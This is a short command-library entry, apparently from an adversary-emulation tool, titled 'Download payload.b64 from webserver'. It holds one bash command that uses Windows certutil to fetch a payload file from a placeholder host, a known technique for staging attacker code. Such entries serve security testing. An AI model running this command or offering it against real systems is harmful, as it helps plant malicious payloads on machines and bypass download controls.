---
id: 548f9107-87f3-452b-8dd8-373d657722bd
name: Download payload.b64 from webserver
type: command
executor: bash
data: certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
output: null
created_at: '2023-04-06T03:56:27.016802+00:00'
updated_at: '2023-04-10T20:37:10.655700+00:00'
---

# Download payload.b64 from webserver

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
```


